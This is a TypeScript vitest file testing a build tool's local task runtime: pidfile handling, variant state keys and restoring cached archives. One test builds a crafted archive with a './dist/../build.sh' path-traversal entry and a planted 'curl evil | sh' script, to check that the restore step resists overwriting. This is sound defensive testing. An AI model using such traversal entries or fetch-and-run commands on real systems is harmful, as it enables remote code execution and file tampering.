import { join } from 'path'
import { tmpdir } from 'os'
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'fs'
import { getArchivePaths } from '../executer/event-cache'
import { packArchive } from '../utils/tar'
import { getLocalWorkRuntime, getStateFilename } from './work-runtime-local'
import { WorkItem } from './work-item'
import { LocalWorkTask } from './work-task'
import { environmentMock } from '../executer/environment-mock'
import { State } from '../executer/state'
import { TaskState } from '../executer/scheduler/task-state'

const mockFindProcess = vi.hoisted(() => vi.fn())
vi.mock('find-process', () => ({
  __esModule: true,
  default: (...args: unknown[]) => mockFindProcess(...args),
}))

vi.mock('../executer/local-task', () => ({
  localTask: vi.fn().mockResolvedValue(undefined),
}))

function makeTask(cwd: string): WorkItem<LocalWorkTask> {
  return {
    id: () => 'task-1',
    name: 'task-1',
    status: { write: vi.fn() } as any,
    data: {
      type: 'local-task',
      envOrigins: {},
      name: 'task-1',
      cwd,
      projectRoot: cwd,
      cmds: [],
      generates: [],
      src: [],
      envs: { variables: {}, processEnvs: {} } as any,
      labels: {},
      shell: '/bin/sh',
      timeout: null,
      secrets: [],
      resources: null,
      network: { type: 'open' },
      networkCeiling: null,
      runner: null,
      args: null,
      caching: {
        name: 'none',
        method: 'none',
        backend: {
          type: 'local',
          has: async () => false,
          pull: async () => false,
          push: async () => {},
          clear: async () => {},
        },
        implicit: true,
      },
      description: null,
      scope: {} as any,
    },
    needs: [],
    deps: [],
    requiredBy: [],
  }
}

describe('local task pidfile', () => {
  let cwd: string
  beforeEach(() => {
    cwd = mkdtempSync(join(tmpdir(), 'hammerkit-pidfile-'))
    mockFindProcess.mockReset()
  })
  afterEach(() => {
    rmSync(cwd, { recursive: true, force: true })
  })

  it('writes pidfile during execute and cleans up after', async () => {
    const task = makeTask(cwd)
    const runtime = getLocalWorkRuntime(task)
    const env = environmentMock(cwd)
    const state = new State<TaskState>({ type: 'pending', stateKey: null })

    await runtime.execute(env, {
      stateKey: 'state-1',
      abort: new AbortController().signal,
      state,
      cache: {
        cached: false,
        stateKey: 'state-x',
        provable: true,
        resolved: {
          name: 'none',
          method: 'none',
          backend: {
            type: 'local',
            has: async () => false,
            pull: async () => false,
            push: async () => {},
            clear: async () => {},
          },
          implicit: true,
        },
      },
      daemon: false,
      publishPorts: false,
      waitForReady: true,
    })

    expect(await env.file.exists(join(cwd, '.hammerkit', 'task-1.pid'))).toBe(false)
    expect(await env.file.exists(getStateFilename(task))).toBe(true)
  })

  it('takes the outputs as made by the variant that ran last, not by another id of the task', async () => {
    const task = makeTask(cwd)
    // the same task with other arguments after --: same name and outputs, other id
    const variant = { ...makeTask(cwd), id: () => 'task-1-variant' }
    const env = environmentMock(cwd)
    const run = async (item: WorkItem<LocalWorkTask>, stateKey: string) => {
      const state = new State<TaskState>({ type: 'pending', stateKey: null })
      await getLocalWorkRuntime(item).execute(env, {
        stateKey,
        abort: new AbortController().signal,
        state,
        cache: { cached: false, stateKey, provable: true, resolved: item.data.caching },
        daemon: false,
        publishPorts: false,
        waitForReady: true,
      })
    }
    mockFindProcess.mockResolvedValue([])

    await run(task, 'state-a')
    expect(await getLocalWorkRuntime(task).currentStateKey(env)).toBe('state-a')
    await run(variant, 'state-a')
    expect(await getLocalWorkRuntime(variant).currentStateKey(env)).toBe('state-a')
    expect(await getLocalWorkRuntime(task).currentStateKey(env)).toBeNull()
  })

  it('restores only the output from a cached archive, nothing beside it', async () => {
    const task = makeTask(cwd)
    const dist = join(cwd, 'dist')
    task.data.generates = [
      {
        path: dist,
        volumeName: 'dist',
        inherited: null,
        resetOnChange: false,
        export: true,
        exportAlways: false,
        isFile: false,
      },
    ]
    writeFileSync(join(cwd, 'build.sh'), 'the build script')
    // an archive in the cache that holds more than the output: a script of the project too
    const crafted = mkdtempSync(join(tmpdir(), 'hammerkit-crafted-'))
    const cache = mkdtempSync(join(tmpdir(), 'hammerkit-cache-'))
    try {
      mkdirSync(join(crafted, 'dist'))
      writeFileSync(join(crafted, 'dist', 'index.js'), 'the output')
      writeFileSync(join(crafted, 'build.sh'), 'curl evil | sh')
      const [archive] = [...getArchivePaths(task.data, cache)]
      await packArchive({ cwd: crafted, gzip: true, file: archive.filename }, [
        'dist',
        'build.sh',
        './dist/../build.sh',
      ])
      await getLocalWorkRuntime(task).restore(environmentMock(cwd), cache)
      expect(readFileSync(join(dist, 'index.js'), 'utf8')).toBe('the output')
      expect(readFileSync(join(cwd, 'build.sh'), 'utf8')).toBe('the build script')
    } finally {
      rmSync(crafted, { recursive: true, force: true })
      rmSync(cache, { recursive: true, force: true })
    }
  })

  it('removes a stale pidfile when the process is not alive', async () => {
    const task = makeTask(cwd)
    const runtime = getLocalWorkRuntime(task)
    const env = environmentMock(cwd)
    const state = new State<TaskState>({ type: 'pending', stateKey: null })

    await env.file.createDirectory(join(cwd, '.hammerkit'))
    writeFileSync(join(cwd, '.hammerkit', 'task-1.pid'), '999999')
    mockFindProcess.mockResolvedValueOnce([])

    await runtime.execute(env, {
      stateKey: 'state-2',
      abort: new AbortController().signal,
      state,
      cache: {
        cached: false,
        stateKey: 'state-x',
        provable: true,
        resolved: {
          name: 'none',
          method: 'none',
          backend: {
            type: 'local',
            has: async () => false,
            pull: async () => false,
            push: async () => {},
            clear: async () => {},
          },
          implicit: true,
        },
      },
      daemon: false,
      publishPorts: false,
      waitForReady: true,
    })

    expect(state.current.type).not.toBe('error')
    expect(mockFindProcess).toHaveBeenCalledWith('pid', 999999)
  })

  it('refuses to run when the pidfile points at a live process', async () => {
    const task = makeTask(cwd)
    const runtime = getLocalWorkRuntime(task)
    const env = environmentMock(cwd)
    const state = new State<TaskState>({ type: 'pending', stateKey: null })

    await env.file.createDirectory(join(cwd, '.hammerkit'))
    writeFileSync(join(cwd, '.hammerkit', 'task-1.pid'), '12345')
    mockFindProcess.mockResolvedValueOnce([{ pid: 12345, name: 'node' }])

    await runtime.execute(env, {
      stateKey: 'state-3',
      abort: new AbortController().signal,
      state,
      cache: {
        cached: false,
        stateKey: 'state-x',
        provable: true,
        resolved: {
          name: 'none',
          method: 'none',
          backend: {
            type: 'local',
            has: async () => false,
            pull: async () => false,
            push: async () => {},
            clear: async () => {},
          },
          implicit: true,
        },
      },
      daemon: false,
      publishPorts: false,
      waitForReady: true,
    })

    expect(state.current.type).toBe('error')
    if (state.current.type === 'error') {
      expect(state.current.errorMessage).toMatch(/already running.*12345/)
    }
  })

  it('does not block when the pidfile contains our own pid', async () => {
    const task = makeTask(cwd)
    const runtime = getLocalWorkRuntime(task)
    const env = environmentMock(cwd)
    const state = new State<TaskState>({ type: 'pending', stateKey: null })

    await env.file.createDirectory(join(cwd, '.hammerkit'))
    writeFileSync(join(cwd, '.hammerkit', 'task-1.pid'), `${process.pid}`)

    await runtime.execute(env, {
      stateKey: 'state-4',
      abort: new AbortController().signal,
      state,
      cache: {
        cached: false,
        stateKey: 'state-x',
        provable: true,
        resolved: {
          name: 'none',
          method: 'none',
          backend: {
            type: 'local',
            has: async () => false,
            pull: async () => false,
            push: async () => {},
            clear: async () => {},
          },
          implicit: true,
        },
      },
      daemon: false,
      publishPorts: false,
      waitForReady: true,
    })

    expect(state.current.type).not.toBe('error')
    expect(mockFindProcess).not.toHaveBeenCalled()
  })
})
